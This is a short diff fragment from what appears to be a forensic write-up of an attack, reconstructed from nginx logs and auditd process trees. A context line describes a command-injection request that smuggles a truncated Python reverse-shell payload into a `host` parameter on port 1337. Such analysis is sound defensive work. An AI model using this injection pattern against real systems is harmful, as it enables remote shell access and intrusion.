@@ -48,7 +48,7 @@ Reviewing `/var/log/nginx/access.log` revealed normal `ping` health-check reques
 3. **Reverse Shell Delivery:** Sent a URL-encoded Python socket reverse shell targeting port `1337` (`GET /ping?host=;python3%20-c%20'import%20socket,subprocess,os...'`).
 
 <img width="1067" height="742" alt="4" src="https://github.com/user-attachments/assets/edcf36f8-cc45-4f2f-b87d-fde8e043b3e1" />
----
+
 
 ## 3. Service Breach & Process Tree Reconstruction (`auditd`)
 
